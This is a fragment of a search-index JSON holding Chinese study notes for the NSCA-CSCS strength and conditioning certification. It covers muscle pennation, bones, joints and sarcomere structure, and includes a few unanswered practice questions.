\uff1a\u8fd9\u4e2a\u5e7f\u6cdb\u7684\u529b\u8303\u56f4\u90e8\u5206\u7531\u808c\u5c0f\u8282\u76f8\u5bf9\u4e8e\u808c\u8089\u957f\u8f74\u7684\u6392\u5217\u65b9\u5f0f\u9020\u6210\u3002 \u7fbd\u72b6\u808c\u7684\u7ed3\u6784 \u5b9a\u4e49 \uff1a\u7fbd\u72b6\u808c\u7684\u808c\u7ea4\u7ef4\u76f8\u5bf9\u4e8e\u808c\u8171\u503e\u659c\u6392\u5217\uff0c\u5f62\u6210\u7fbd\u6bdb\u72b6\u7684\u7ed3\u6784\u3002 \u7fbd\u72b6\u89d2 \uff1a\u808c\u7ea4\u7ef4\u4e0e\u808c\u8089\u8d77\u6b62\u70b9\u8fde\u7ebf\u4e4b\u95f4\u7684\u5939\u89d2\u3002\u7fbd\u72b6\u89d2\u4e3a0\u65f6\uff0c\u808c\u8089\u4e0d\u662f\u7fbd\u72b6\u808c\u3002 \u5e38\u89c1\u89d2\u5ea6 \uff1a\u4eba\u4f53\u5927\u591a\u6570\u7fbd\u72b6\u808c\u7684\u7fbd\u72b6\u89d2\u4e0d\u8d85\u8fc715\u00b0\u3002\u7fbd\u72b6\u89d2\u4f1a\u5728\u808c\u8089\u6536\u7f29\u65f6\u53d8\u5927\u3002 \u7fbd\u72b6\u89d2\u5bf9\u808c\u8089\u529b\u91cf\u548c\u901f\u5ea6\u7684\u5f71\u54cd \u529b\u91cf\u548c\u6536\u7f29\u901f\u5ea6 \uff1a \u7fbd\u72b6\u89d2\u5927\u7684\u808c\u8089 \uff1a\u6709\u66f4\u591a\u5e73\u884c\u6392\u5217\u7684\u808c\u5c0f\u8282\uff0c\u4ea7\u751f\u66f4\u5927\u7684\u529b\u91cf\uff0c\u4f46\u6700\u5927\u6536\u7f29\u901f\u5ea6\u8f83\u4f4e\u3002 \u7fbd\u72b6\u89d2\u5c0f\u7684\u808c\u8089 \uff1a\u6709\u66f4\u591a\u4e32\u8054\u7684\u808c\u5c0f\u8282\uff0c\u4ea7\u751f\u8f83\u9ad8\u7684\u6700\u5927\u6536\u7f29\u901f\u5ea6\uff0c\u4f46\u529b\u91cf\u8f83\u5c0f\u3002 \u5f71\u54cd\u7c7b\u578b \uff1a\u7fbd\u72b6\u89d2\u5f71\u54cd\u808c\u8089\u4ea7\u751f\u79bb\u5fc3\u3001\u7b49\u957f\u6216\u4f4e\u901f\u5411\u5fc3\u529b\u91cf\u7684\u80fd\u529b\u3002 \u7fbd\u72b6\u89d2\u7684\u53ef\u5851\u6027 \u9057\u4f20\u548c\u8bad\u7ec3 \uff1a\u7fbd\u72b6\u89d2\u53d7\u9057\u4f20\u56e0\u7d20\u5f71\u54cd\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u8bad\u7ec3\u6539\u53d8\u3002\u8fd9\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u808c\u8089\u4f53\u79ef\u76f8\u4f3c\u7684\u4eba\u8868\u73b0\u51fa\u4e0d\u540c\u7684\u529b\u91cf\u548c\u901f\u5ea6\u3002 \u808c\u8089\u7684\u7fbd\u72b6\u7ed3\u6784\u53ca\u5176\u7fbd\u72b6\u89d2\u5bf9\u808c\u8089\u7684\u529b\u91cf\u548c\u901f\u5ea6\u6709\u91cd\u8981\u5f71\u54cd\u3002\u7fbd\u72b6\u89d2\u5927\u7684\u808c\u8089\u66f4\u64c5\u957f\u4ea7\u751f\u529b\u91cf\uff0c\u800c\u7fbd\u72b6\u89d2\u5c0f\u7684\u808c\u8089\u66f4\u64c5\u957f\u4ea7\u751f\u901f\u5ea6\u3002\u5c3d\u7ba1\u7fbd\u72b6\u89d2\u53d7\u9057\u4f20\u56e0\u7d20\u5f71\u54cd\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u8bad\u7ec3\u8fdb\u884c\u8c03\u6574\uff0c\u4ece\u800c\u4f18\u5316\u808c\u8089\u7684\u529f\u80fd\u548c\u8868\u73b0\u3002 \u808c\u8089\u957f\u5ea6 \u5f53\u808c\u8089\u5904\u4e8e\u9759\u606f\u957f\u5ea6\u65f6\uff0c\u808c\u52a8\u86cb\u767d\u4e1d\u548c\u808c\u7403\u86cb\u767d\u4e1d\u9760\u8fd1\u5f7c\u6b64\uff0c\u4f7f\u5176\u5177\u6709\u6700\u5927\u6570\u91cf\u7684\u53ef\u7ed3\u5408\u7684\u6a2a\u6865\u4f4d\u70b9(\u56fe2.12)\u3002\u56e0\u6b64\uff0c\u808c\u8089\u53ef\u4ee5\u5728\u5176\u9759\u606f\u957f\u5ea6\u65f6\u4ea7\u751f\u6700\u5927\u7684\u529b\u3002\u5f53\u808c\u8089\u88ab\u5927\u5e45\u62c9\u4f38\uff0c\u957f\u5ea6\u8d85\u8fc7\u5176\u9759\u606f\u957f\u5ea6\u65f6\uff0c\u808c\u52a8\u86cb\u767d\u4e1d\u548c\u808c\u7403\u86cb\u767d\u4e1d\u5f7c\u6b64\u91cd\u53e0\u7684\u90e8\u4f4d\u51cf\u5c11\u3002\u56e0\u4e3a\u6f5c\u5728\u7684\u6a2a\u6865\u4f4d\u70b9\u51cf\u5c11\uff0c\u6240\u4ee5\u808c\u8089\u4e0d\u80fd\u4ea7\u751f\u4e0e\u9759\u606f\u957f\u5ea6\u76f8\u540c\u7684\u529b\u3002\u5f53\u808c\u8089\u6536\u7f29\u8fc7\u591a\uff0c\u957f\u5ea6\u8fdc\u5c0f\u4e8e\u5176\u9759\u606f\u957f\u5ea6\u65f6\uff0c\u808c\u52a8\u86cb\u767d\u4e1d\u91cd\u53e0\uff0c\u5e76\u4e14\u6a2a\u6865\u4f4d\u70b9\u7684\u6570\u91cf\u51cf\u5c11\uff0c\u4ece\u800c\u964d\u4f4e\u4e86\u4ea7\u751f\u529b\u7684\u80fd\u529b\u3002 \u95ee\u9898\uff1a\u5728\u819d\u76d6\u5f2f\u66f2\u7684\u817f\u5f2f\u4e3e\u8fd0\u52a8\u4e2d\uff0c\u4e0b\u9762\u54ea\u4e2a\u7ed3\u6784\u5185\u7684\u80a1\u4e8c\u5934\u808c\u808c\u8282\u957f\u5ea6\u7684\u51cf\u5c11\u5e76\u6700\u7ec8\u6d88\u5931\u4e86? A\u3001A\u5e26 B\u3001H\u533a C\u3001l\u5e26 \u8fd9\u9053\u9898\u5e94\u8be5\u9009\u54ea\u4e2a\uff1f \u95ee\u9898\uff1a\u529b\u81c2\u662f\u529b\u7684\u4f5c\u7528\u7ebf\u5230\u652f\u70b9\u7684\u5782\u76f4\u8ddd\u79bb\uff0c\u4e3a\u4ec0\u4e48\u4e00\u4e2a\u77ed\u529b\u81c2\u5bf9\u5927\u591a\u6570\u5173\u8282\u5468\u56f4\u7684\u808c\u8089\u7ec4\u7ec7\u6709\u597d\u5904? A\u3001\u6240\u4ee5\u673a\u68b0\u6548\u76ca\u7684\u6bd4\u7387\u9ad8 B\u3001\u5b83\u5141\u8bb8\u52a8\u4f5c\u66f4\u5bb9\u6613\u5b8c\u6210 C\u3001\u6240\u4ee5\u808c\u8089\u66f4\u52a0\u52aa\u529b\u5730\u5de5\u4f5c \u8fd9\u9053\u9898\u5e94\u8be5\u9009\u54ea\u4e2a\uff1f \u95ee\u9898\uff1a\u5173\u4e8e\u201c\u6211\u7684\u76d8\u4e2d\u9910\u201d\uff0c\u4ee5\u4e0b\u8bed\u53e5\u4e2d\u6709\u54ea\u4e9b\u662f\u9519\u8bef\u7684? A\u3001\u6392\u9664\u6574\u4e2a\u98df\u7269\u7ec4\u7684\u4eba\u5e94\u8be5\u4e0e\u8425\u517b\u5e08\u5408\u4f5c\u5bfb\u627e\u5408\u9002\u7684\u66ff\u4ee3\u54c1\u4ee5\u6ee1\u8db3\u8425\u517b\u9700\u6c42 B\u3001\u6211\u7684\u76d8\u4e2d\u9910\u4e2d\u663e\u793a\u7684\u98df\u7269\u7ec4\u5305\u62ec\u8c37\u7269\uff0c\u852c\u83dc\uff0c\u6c34\u679c\uff0c\u86cb\u767d\u8d28\u98df\u7269\u548c\u4e73\u5236\u54c1 C\u3001\u6211\u7684\u76d8\u4e2d\u9910\u5305\u62ec\u4f5c\u4e3a\u98df\u7269\u7ec4\u7684\u6cb9 \u8fd9\u9053\u9898\u5e94\u8be5\u9009\u54ea\u4e2a\uff1f \u95ee\u9898\uff1a\u4e00\u540d\u5973\u5b50\u5927\u5b66\u751f\u7bee\u7403\u524d\u950b\u6b63\u5904\u4e8e\u8d5b\u5b63\u3002\u5979\u5bf9\u81ea\u5df1\u7684\u4f53\u91cd\u6bd4\u8f83\u6ee1\u610f\uff0c\u4f46\u60f3\u77e5\u9053\u5979\u7684\u996e\u98df\u662f\u5426\u9002\u5408\u5979\u7684\u9700\u8981\u3002\u5979\u6bcf\u5929\u7684\u5361\u8def\u91cc\u6444\u5165\u91cf\u5305\u62ec\u4ee5\u4e0b\u5185\u5bb9: \u78b3\u6c34\u5316\u5408\u7269\uff1a1500 kcals \u86cb\u767d\u8d28\uff1a500 kcals \u8102\u80aa\uff1a350 kcals \u5173\u4e8e\u4e09\u5927\u8425\u517b\u7d20\u7684\u914d\u6bd4\u8c03\u6574\uff0c\u4e0b\u5217\u54ea\u9879\u5efa\u8bae\u6700\u6070\u5f53? \u78b3\u6c34\u5316\u5408\u7269 \u86cb\u767d\u8d28 \u8102\u80aa A\u3001\u4fdd\u6301 \u51cf\u5c11 \u589e\u52a0 B\u3001\u589e\u52a0 \u589e\u52a0 \u4fdd\u6301 C\u3001\u51cf\u5c11 \u4fdd\u6301 \u51cf\u5c11 \u8fd9\u9053\u9898\u5e94\u8be5\u9009\u54ea\u4e2a\uff1f","title":"NSCA-CSCS\u4f53\u80fd\u6559\u7ec3\u7b14\u8bb0"},{"location":"soft/NSCA/#_1","text":"\u4eba\u4f53\u7ea6\u6709206\u5757\u9aa8\u9abc\uff0c\u51c6\u786e\u7684\u6570\u5b57\u53ef\u80fd\u4f1a\u56e0\u4eba\u800c\u5f02\u3002\u8fd9\u79cd\u76f8\u5bf9\u8f83\u8f7b\u4f46\u662f\u5f88\u575a\u56fa\u7684\u7ed3\u6784\u8d77\u5230\u4e86\u63d0\u4f9b\u6760\u6746\u3001\u652f\u6491\u4ee5\u53ca\u4fdd\u62a4\u7684\u4f5c\u7528","title":"\u4eba\u4f53\u9aa8\u9abc\u6570\u91cf"},{"location":"soft/NSCA/#_2","text":"\u6709\u51e0\u79cd\u60c5\u51b5\u53ef\u4ee5\u5bf9\u6210\u4eba\u9aa8\u9abc\u4ea7\u751f\u6b63\u9762\u5f71\u54cd\uff0c\u8fd9\u5176\u4e2d\u5927\u591a\u6570\u662f\u4f7f\u7528\u808c\u8089\u7684\u7ed3\u679c\u3002\u5f53\u8eab\u4f53\u627f\u53d7\u8f83\u5927\u8d1f\u8377(\u5de5\u4f5c\u548c \u6297\u963b\u8bad\u7ec3 )\u65f6\uff0c\u9aa8\u5bc6\u5ea6\u548c\u9aa8\u77ff\u7269\u8d28\u542b\u91cf\u5c06\u589e\u52a0\u3002\u5982\u679c\u8eab\u4f53\u6267\u884c \u5177\u6709\u8f83\u5f3a\u51b2\u51fb\u6027\u548c\u7206\u53d1\u6027\u7684\u52a8\u4f5c \uff0c\u4e5f\u53ef\u80fd\u53d1\u751f\u7c7b\u4f3c\u7684\u53d8\u5316\u3002\u7c7b\u4f3c\u7684\u9aa8\u5bc6\u5ea6\u63d0\u9ad8\u7684\u60c5\u51b5\u5728\u4ece\u4e8b\u4f53\u64cd\u6d3b\u52a8\uff0c\u6216\u5176\u4ed6\u6d89\u53ca\u9ad8\u529b\u91cf\u3001\u9ad8\u7206\u53d1\u529b\u53ca\u786c\u843d\u5730\u6d3b\u52a8\u7684\u4eba\u7fa4\u4e2d\u90fd\u80fd\u88ab\u89c2\u6d4b\u5230\u3002\u5f71\u54cd\u9aa8\u9abc\u9002\u5e94\u7684\u5176\u4ed6\u56e0\u7d20\u5305\u62ec\u4e2d\u8f74\u9aa8\u662f\u5426\u627f\u53d7\u8d1f\u8377\uff0c\u4ee5\u53ca\u8d1f\u8377\u53d1\u751f\u7684\u9891\u7387\u3002\u7531\u4e8e\u9aa8\u9abc\u7684\u9002\u5e94\u671f\u6bd4\u9aa8\u9abc\u808c\u957f\uff0c\u6240\u4ee5\u6539\u53d8\u523a\u6fc0\u7684\u9891\u7387\u3001\u5f3a\u5ea6\u548c\u5f62\u5f0f\u975e\u5e38\u91cd\u8981\u3002 \u6807\u8bb0\u4e0a\u62fc\u97f3\uff1a \u9501\u9aa8 (su\u01d2 g\u01d4) \u80a9\u80db\u9aa8 (ji\u0101n ji\u01ce g\u01d4) \u80f8\u9aa8 (xi\u014dng g\u01d4) \u80b1\u9aa8 (g\u014dng g\u01d4) \u808b\u9aa8 (l\u00e8i g\u01d4) \u810a\u67f1 (j\u01d0 zh\u00f9) \u9ac2\u5d74 (qi\u00e0 j\u00ed) \u9aa8\u683c (g\u01d4 g\u00e9) \u5c3a\u9aa8 (ch\u01d0 g\u01d4) \u76c6\u9aa8 (p\u00e9n g\u01d4) \u9aa8\u8155 (g\u01d4 w\u00e0n) \u638c\u9aa8 (zh\u01ceng g\u01d4) \u80a1\u9aa8 (g\u01d4 g\u01d4) \u9acc\u9aa8 (b\u00ecn g\u01d4) \u80eb\u9aa8 (j\u00ecng g\u01d4) \u8153\u9aa8 (f\u00e9i g\u01d4) \u8dd6\u9aa8 (zh\u00ed g\u01d4)","title":"\u9aa8\u5bc6\u5ea6\u589e\u52a0"},{"location":"soft/NSCA/#_3","text":"\u9aa8\u4e0e\u9aa8\u4e4b\u95f4\u7684\u8fde\u7ed3\u53eb\u5173\u8282\u3002\u7ea4\u7ef4\u5173\u8282\uff08\u4f8b\u5982\u9885\u9aa8\u7684\u9aa8\u7f1d)\u51e0\u4e4e\u4e0d\u80fd\u6d3b\u52a8\uff0c\u8f6f\u9aa8\u5173\u8282\uff08\u4f8b\u5982\u690e\u95f4\u76d8)\u7684\u6d3b\u52a8\u8303\u56fa\u6709\u9650\uff0c\u6ed1\u819c\u5173\u8282\uff08\u4f8b\u5982\u8098\u5173\u8282\u548c\u819d\u5173\u8282)\u7684\u6d3b\u52a8\u8303\u56f4\u76f8\u5f53\u5927\u3002\u8fd0\u52a8\u548c\u953b\u70bc\u7684\u52a8\u4f5c\u4e3b\u8981\u56f4\u7ed5\u7740\u6ed1\u819c\u5173\u8282\u53d1\u751f\uff0c\u800c\u6ed1\u819c\u5173\u8282\u7684\u6700\u4e3b\u8981\u7279\u5f81\u662f\u6469\u64e6\u529b\u4f4e\u3001\u6d3b\u52a8\u8303\u56f4\u5927\u3002\u7ec4\u6210\u5173\u8282\u7684\u9aa8\u7684\u672b\u7aef\u8986\u76d6\u7740\u5149\u6ed1\u7684\u900f\u660e\u8f6f\u9aa8\uff0c\u5e76\u4e14\u6574\u4e2a\u5173\u8282\u88ab\u5305\u88f9\u5728\u5145\u6ee1\u6ed1\u6db2\u7684\u5173\u8282\u56ca\u4e2d\u3002\u6ed1\u819c\u5173\u8282\u901a\u5e38\u8fd8\u6709\u97e7\u5e26\u548c\u5173\u8282\u5185\u8f6f\u9aa8\u4f5c\u4e3a\u8f85\u52a9\u7ed3\u6784","title":"\u5173\u8282"},{"location":"soft/NSCA/#_4","text":"\u51e0\u4e4e\u6240\u6709\u7684\u5173\u8282\u8fd0\u52a8\u90fd\u6d89\u53ca\u56f4\u7ed5\uff0c\u70b9\u6216\u8f74\u7684\u65cb\u8f6c\u3002\u5173\u8282\u53ef\u4ee5\u4f9d\u636e\u5176\u80fd\u591f\u53d1\u751f\u65cb\u8f6c\u7684\u65b9\u5411\u7684\u6570\u91cf\u8fdb\u884c\u5206\u7c7b\u3002\u5355\u8f74\u5173\u8282\uff08\u4f8b\u5982\u65f6\u5173\u8282\uff09 \u50cf\u94f0\u94fe\u4e00\u6837\u8fd0\u4f5c\uff0c\u57fa\u672c\u4e0a\u53ea\u56f4\u7ed5\u4e00\u4e2a\u8f74\u65cb\u8f6c\u3002\u819d\u5173\u8282\u7ecf\u5e38\u88ab\u8ba4\u4e3a\u662f\u4e00\u4e2a\u94f0\u94fe\u5173\u8282\uff0c\u4f46\u4e8b\u5b9e\u4e0a\uff0c\u5176\u65cb\u8f6c\u8f74\u4f1a\u6839\u636e\u5173\u8282\u6d3b\u52a8\u8303\u56f4\u800c\u53d1\u751f\u6539\u53d8\u3002\u53cc\u8f74\u5173\u8282\uff08\u4f8b\u5982\u8e1d\u5173\u8282\u548c\u8155\u5173\u8282)\u53ef\u4ee5\u56f4\u7ed5\u4e24\u4e2a\u76f8\u4e92\u5782\u76f4\u7684\u8f74\u8f6c\u52a8\u3002\u591a\u8f74\u5173\u8282\uff08\u4f8b\u5982\u80a9\u5173\u8282\u8fd9\u6837\u7684\u7403\u7a9d\u5173\u8282)\u53ef\u4ee5\u56f4\u7ed5\u5b9a\u4e49\u7a7a\u95f4\u7684\u4e09\u4e2a\u76f8\u4e92\u5782\u76f4\u7684\u8f74\u8f6c\u52a8\u3002 \u6807\u8bb0\u4e0a\u62fc\u97f3\uff1a \u4e09\u89d2\u808c (s\u0101n ji\u01ceo j\u012b) \u80f8\u5927\u808c (xi\u014dng d\u00e0 j\u012b) \u80b1\u4e8c\u5934\u808c (g\u014dng \u00e8r t\u00f3u j\u012b) \u8179\u76f4\u808c (f\u00f9 zh\u00ed j\u012b) \u80b1\u808c (g\u014dng j\u012b) \u8179\u5916\u659c\u808c (f\u00f9 w\u00e0i xi\u00e9 j\u012b) \u80b1\u6861\u808c (g\u014dng r\u00e1o j\u012b) \u6307\u5c48\u808c (zh\u01d0 q\u016b j\u012b) \u957f\u6536\u808c (ch\u00e1ng sh\u014du j\u012b) \u80a1\u8584\u808c (g\u01d4 b\u00f3 j\u012b) \u7f1d\u5320\u808c (f\u00e9ng ji\u00e0ng j\u012b) \u80a1\u76f4\u808c (g\u01d4 zh\u00ed j\u012b) \u80a1\u5916\u4fa7\u808c (g\u01d4 w\u00e0i c\u00e8 j\u012b) \u80a1\u5185\u4fa7\u808c (g\u01d4 n\u00e8i c\u00e8 j\u012b) \u80eb\u9aa8\u524d\u808c (j\u00ecng g\u01d4 qi\u00e1n j\u012b) \u659c\u65b9\u808c (xi\u00e9 f\u0101ng j\u012b) \u5188\u4e0b\u808c (g\u0101ng xi\u00e0 j\u012b) \u5927\u5706\u808c (d\u00e0 yu\u00e1n j\u012b) \u80b1\u4e09\u5934\u808c (g\u014dng s\u0101n t\u00f3u j\u012b) \u80cc\u9614\u808c (b\u00e8i ku\u00f2 j\u012b) \u6307\u4f38\u808c (zh\u01d0 sh\u0113n j\u012b) \u81c0\u5927\u808c (t\u00fan d\u00e0 j\u012b) \u534a\u8171\u808c (b\u00e0n ji\u00e0n j\u012b) \u80a1\u4e8c\u5934\u808c (g\u01d4 \u00e8r t\u00f3u j\u012b) \u534a\u819c\u808c (b\u00e0n m\u00f3 j\u012b) \u8153\u80a0\u808c (f\u00e9i ch\u00e1ng j\u012b) \u6bd4\u76ee\u9c7c\u808c (b\u01d0 m\u00f9 y\u00fa j\u012b)","title":"\u5173\u8282\u5206\u7c7b"},{"location":"soft/NSCA/#_5","text":"\u808c\u8089\u8bb2\u89e3 \u6bcf\u4e00\u5757\u9aa8\u9abc\u808c\u90fd\u662f\u4e00\u4e2a\u5305\u542b\u4e86\u808c\u8089\u7ec4\u7ec7\u3001\u7ed3\u7f14\u7ec4\u7ec7\u3001\u795e\u7ecf\u548c\u8840\u7ba1\u7684\u5668\u5b98\u3002\u7ea4\u7ef4\u72b6\u7ed3\u7f14\u7ec4\u7ec7\uff0c\u53c8\u79f0\u808c\u5916\u819c\uff0c\u8986\u76d6\u4e86\u5168\u8eab\u591a\u8fbe430\u4f59\u5757\u9aa8\u9abc\u808c\u3002\u808c\u5916\u819c\u4e0e\u808c\u8089\u672b\u7aef\u7684\u808c\u8171\u76f8\u8fde\uff0c\u808c\u8171\u8fde\u63a5\u7740\u9aa8\u819c\uff0c\u9aa8\u819c\u662f\u8986\u5728\u6240\u6709\u9aa8\u9abc\u8868\u9762\u7684\u7279\u5316\u7ed3\u7f14\u7ec4\u7ec7\uff1b\u4efb\u4f55\u808c\u8089\u7684\u6536\u7f29\u529b\u90fd\u4f1a\u901a\u8fc7\u808c\u8171\u4f20\u5bfc\u81f3\u9aa8\u9abc\u3002\u4e0a\u4e0b\u80a2\u7684\u808c\u8089\u5728\u9aa8\u9abc\u4e0a\u7684\u4e24\u4e2a\u9644\u7740\u7aef\u79f0\u4e3a\u8fd1\u7aef\uff08\u9760\u8fd1\u8eaf\u5e72\uff09\u548c\u8fdc\u7aef(\u8fdc\u79bb\u8eaf\u5e72)\u3002\u8eaf\u5e72\u808c\u8089\u7684\u4e24\u4e2a\u9644\u7740\u7aef\u79f0\u4e3a\u4e0a\u7aef\uff08\u9760\u8fd1\u5934)\u548c\u4e0b\u7aef\uff08\u9760\u8fd1\u811a\uff09\u3002 \u808c\u7ec6\u80de\uff0c\u5e38\u88ab\u79f0\u4e3a\u808c\u7ea4\u7ef4\uff0c\u5448\u957f\u6761\u5f62(\u6709\u65f6\u4e0e\u6574\u6761\u808c\u8089\u7684\u957f\u5ea6\u76f8\u540c\uff0c\u662f\u76f4\u5f84\u4e3a50~100um(\u548c\u4e00\u6839\u5934\u53d1\u7684\u76f4\u5f84\u76f8\u5f53)\u7684\u5706\u7ba1\u72b6\u7ec6\u80de\u3002\u8fd9\u4e9b\u808c\u7ea4\u7ef4\u5728\u5916\u56f4\u6709\u591a\u4e2a\u7ec6\u80de\u6838\uff0c \u5e76\u4e14\u5728\u4f4e\u500d\u663e\u5fae\u955c\u4e0b\u5448\u73b0\u6761\u7eb9\u72b6\u3002\u5728\u808c\u5916\u819c\u5185\uff0c\u6700\u591a\u53ef\u8fbe150\u6839\u5de6\u53f3\u7684\u808c\u7ea4\u7ef4\u805a\u96c6\u6210\u675f(\u808c\u675f)\u3002\u808c\u675f\u88ab\u79f0\u4e3a\u808c\u675f\u819c\u7684\u7ed3\u7f14\u7ec4\u7ec7\u5305\u88f9\u7740\u3002\u6bcf\u6839\u808c\u7ea4\u7ef4\u88ab\u79f0\u4e3a\u808c\u5185\u819c\u7684\u7ed3\u7f14\u7ec4\u7ec7\u5305\u88f9\uff0c\u808c\u5185\u819c\u4e0e\u808c\u7ea4\u7ef4\u819c\u76f8\u8fde\u63a5\u3002\u6240\u6709\u7ed3\u7f14\u7ec4\u7ec7\u808c\u5916\u819c\u3001\u808c\u675f\u819c\u548c\u808c\u5185\u819c\u90fd\u4e0e\u808c\u8171\u76f8\u8fde\uff0c\u6240\u4ee5\u808c\u7ec6\u80de\u4e2d\u4ea7\u751f\u7684\u5f20\u529b\u6700\u7ec8\u4f20\u5bfc\u81f3\u808c\u8171\u548c\u4e0e\u5176\u8fde\u63a5\u7684\u9aa8\u4e0a\u3002","title":"\u808c\u8089\u7ed3\u6784"},{"location":"soft/NSCA/#_6","text":"\u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u548c\u5b83\u6240\u63a7\u5236\u7684\u808c\u7ea4\u7ef4\u7684\u63a5\u5408\u70b9\u79f0\u4e3a\u8fd0\u52a8\u7ec8\u677f\u6216\u795e\u7ecf\u808c\u8089\u63a5\u5934\u3002\u5c3d\u7ba1\u4e00\u6839\u8fd0\u52a8\u795e\u7ecf\u63a7\u5236\u7740\u5f88\u591a\u751a\u81f3\u6210\u767e\u4e0a\u5e72\u6761\u808c\u7ea4\u7ef4\uff0c\u4f46\u6bcf\u4e2a\u808c\u7ec6\u80de\u4ec5\u6709\u4e00\u4e2a\u795e\u7ecf\u808c\u8089\u63a5\u5934\u3002\u4e00\u4e2a\u8fd0\u52a8\u795e\u7ecf\u5143\u4e0e\u5176\u63a7\u5236\u7684\u808c\u7ea4\u7ef4\u88ab\u79f0\u4e3a\u4e00\u4e2a\u8fd0\u52a8\u5355\u4f4d\u3002\u5728\u88ab\u8fd0\u52a8\u795e\u7ecf\u6fc0\u6d3b\u540e\uff0c \u4e00\u4e2a\u8fd0\u52a8\u5355\u4f4d\u7684\u6240\u6709\u808c\u7ea4\u7ef4\u4f1a\u540c\u65f6\u6536\u7f29\u3002","title":"\u808c\u7ec6\u80de\u662f\u5982\u4f55\u88ab\u63a7\u5236\u7684"},{"location":"soft/NSCA/#_7","text":"\u808c\u7ea4\u7ef4\u7684\u5185\u90e8\u7ed3\u6784\u5982\u56fe1.5\u6240\u793a\u3002\u808c\u6d46\u662f\u808c\u7ea4\u7ef4\u7684\u7ec6\u80de\u8d28\uff0c\u5305\u542b\u7531\u86cb\u767d\u4e1d\u3001\u5176\u4ed6\u79cd\u7c7b\u86cb\u767d\u8d28\u3001\u50a8\u5907\u7684\u7cd6\u539f\u3001\u8102\u80aa\u9897\u7c92\u3001\u9176\u548c\u7279\u5b9a\u7ec6\u80de\u5668\uff08\u4f8b\u5982\u7ebf\u7c92\u4f53\u548c\u808c\u8d28\u7f51)\u7ec4\u6210\u7684\u6536\u7f29\u6210\u5206\u3002","title":"\u808c\u7ec6\u80de\u5185\u90e8\u7ed3\u6784"},{"location":"soft/NSCA/#_8","text":"\u6570\u767e\u6761\u808c\u539f\u7ea4\u7ef4(\u6bcf\u6761\u76f4\u5f84\u5927\u7ea6\u4e3a1\u03bcm,\u662f\u4e00\u6839\u5934\u53d1\u7684\u76f4\u5f84\u7684\u767e\u5206\u4e4b\u4e00)\u5360\u636e\u4e86\u808c\u6d46\u7684\u5927\u90e8\u5206\u7a7a\u95f4\u3002\u808c\u539f\u7ea4\u7ef4\u5305\u542b\u4f7f\u808c\u7ec6\u80de\u6536\u7f29\u7684\u5668\u5b98\uff0c\u8fd9\u4e00\u5668\u5b98\u4e3b\u8981\u7531\u4e24\u7c7b\u808c\u4e1d\u6784\u6210\uff1a\u808c\u7403\u86cb\u767d\u4e1d\u548c\u808c\u52a8\u86cb\u767d\u4e1d\u3002\u808c\u7403\u86cb\u767d\u4e1d(\u7c97\u808c\u4e1d\uff0c\u76f4\u5f84\u5927\u7ea6\u4e3a16nm,\u76f8\u5f53\u4e8e\u4e00\u6839\u5934\u53d1\u4e1d\u76f4\u5f84\u7684\u4e07\u5206\u4e4b\u4e00)\u6700\u591a\u53ef\u5305\u542b200\u4e2a\u808c\u7403\u86cb\u767d\u5206\u5b50\u3002 \u808c\u7403\u86cb\u767d\u4e1d\u7531\u4e00\u4e2a\u7403\u72b6\u5934\u3001\u4e00\u4e2a\u94f0\u94fe\u70b9\u548c\u4e00\u6761\u7ea4\u7ef4\u5c3e\u90e8\u7ec4\u6210\u3002\u7403\u72b6\u5934\u6309\u89c4\u5f8b\u95f4\u9694\u5206\u5e03\u5728\u808c\u7403\u86cb\u767d\u4e1d\u4e0a\u4e14\u5411\u5916\u7a81\u51fa\uff0c\u4e00\u5bf9\u808c\u7403\u86cb\u767d\u4e1d\u4f1a\u6784\u6210\u6a2a\u6865\uff0c\u4e0e\u808c\u52a8\u86cb\u767d\u76f8\u4e92\u4f5c\u7528\u3002\u808c\u52a8\u86cb\u767d\u4e1d(\u7ec6\u808c\u4e1d\uff0c\u76f4\u5f84\u7ea6\u4e3a6nm)\u75312\u6761\u53cc\u87ba\u65cb\u72b6\u6392\u5217\u7684\u7ec6\u4e1d\u7ec4\u6210\u3002\u808c\u7403\u86cb\u767d\u4e1d\u548c\u808c\u52a8\u86cb\u767d\u4e1d\u5728\u6784\u6210\u9aa8\u9abc\u808c\u7684\u6700\u5c0f\u6536\u7f29\u5355\u4f4d\u2014\u2014 \u808c\u8282 \u5185\uff0c\u7eb5\u5411\u6392\u5217\u3002\u5728\u653e\u677e\u7684\u808c\u7ea4\u7ef4\u4e2d\uff0c\u808c\u8282\u5e73\u5747\u957f\u5ea6\u4e3a2.5\u03bcm(1cm\u957f\u7684\u808c\u8089\u4e2d\u5927\u7ea6\u67094500\u4e2a\u808c\u8282)\"\u3002\u6bcf\u6761\u808c\u7ea4\u7ef4\u7531\u8fde\u7eed\u4e0d\u65ad\u7684\u808c\u8282\u6784\u6210\u3002 \u4e0a\u56fe\u5c55\u793a\u4e86\u808c\u7403\u86cb\u767d\u4e0e\u808c\u52a8\u86cb\u767d\u5728\u808c\u8282\u4e2d\u7684\u7ed3\u6784\u4e0e\u65b9\u5411\u3002\u76f8\u90bb\u7684\u808c\u7403\u86cb\u767d\u4e1d\u5728\u808c\u8282\u4e2d\u592e\u7684M\u6865\u5f7c\u6b64\u76f8\u8fde(H\u533a\u4e2d\u592e)\u3002\u808c\u52a8\u86cb\u767d\u4e1d\u5728\u808c\u8282\u4e24\u7aef\u5bf9\u9f50\u5e76\u56fa\u5b9a\u5728Z\u7ebf\u4e0a\u3002Z\u7ebf\u5728\u6574\u6761\u808c\u539f\u7ea4\u7ef4\u4e0d\u65ad\u91cd\u590d\u30026\u6761\u808c\u52a8\u86cb\u767d\u4e1d\u73af\u7ed51\u6761\u808c\u7403\u86cb\u767d\u4e1d\uff0c3\u6761\u808c\u7403\u86cb\u767d\u4e1d\u73af\u7ed51\u6761\u808c\u52a8\u86cb\u767d\u4e1d\u3002 